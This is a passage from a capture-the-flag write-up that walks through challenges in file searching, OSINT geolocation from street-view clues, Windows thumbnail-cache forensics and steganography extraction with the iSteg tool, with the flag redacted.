Next, I noticed that there were a lot of .txt files among all the .exe and .bat files. So before I started downloading any malware to start analyzing, I just went through each .txt and .html file searching for a 'flag' or any suspcious base64 strings. `Ctrl+F` was my friend.

Luckily for me, in one of the files, nestled in a subdirectory, I found the flag in plain text. This was good news because there was a lot of encrypted text throughout.

### Under The Bridge
>**Prompt:** Can you find this iconic location?

The link provided for osint.golf has another "Geoguesser" style problem. We are dropped into a Google Maps street view and must find where we are based off the clues we can see from that spot.

A quick look around showed parking signs and warnings in English. So we are probably in an English speaking country.

The look around also showed a few business signs:
- "SHURGARD SELF-STORAGE"
- FlashPark (On a parking spot sign)

I followed the Shurgard clue. A quick google search showed that Shurgard is a European storage company that has locations in Belgium, Denmark, France, Germany, Sweden, the Netherlands, the UK, and the US.

So I see two main english speaking countries here, the UK and the US. To narrow it down between these two, I turned to the traffic signs I saw earlier. Two things stuck out:
1. I do not recognize them as US signs
2. The bridge height sign is in meters(m) not feet.

Okay, so I'm in the UK somewhere. I pulled up google maps and search for Shurgard in the UK. There are a fair amount of them that show up, most of them in and around London. I checked a few of the outer ones to narrow down to London specifically.

Then I started looking for Shurgards that were located adjacent to bridges. Specifically bridges over small streets. A lot of the possibilities were located near bridges over major highways. This significantly narrowed things down.

I started just going through them until I found the right one. I dropped my pin on the small map there and got the flag.

### Opposable Thumbs
>**Prompt:** We uncovered a database. Perhaps the flag is right between your fingertips!

The file downloaded is called thumbcache_256.db.

I didn't know what a thumbcache was so I looked at it. It is short for Thumbnail cache. Which is a database that is used by windows to store thumbnail images.

I downloaded  a (thumbcache viewer)[https://thumbcacheviewer.github.io/] (use at your own risk, I know nothing about this). Which basically just opens the databases and lets you scroll through the contents.

None of the names were interesting, but scrolling through I was able to see thumbnails. The thumbnail for '3fa8aafdd63e1168.jpg' contained the flag.

### Land Before Time
>**Prompt:** This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb.

Another steganogrpahy problem. I started out by finding iSteg since it was mentioned by name. I found it at (this repo)[https://github.com/rafiibrahim8/iSteg] and downloaded the CLI version.

```
java -jar iSteg-v2.01_CLI.jar

iSteg CLI v-2.01
Enter your choice:
        1. Hide a file with Steg
        2. Hide a message with Steg
        3. Extract stuff from Steg
        Enter any things to exit.

3
Enter file name with extension:
dinosaurs1.png
Password (Press enter if the steganographic data wasn't encrypted):

Message extraction successful. The text is:

flag{------------------------}
```

Pretty simple because I just used the tool they called out.
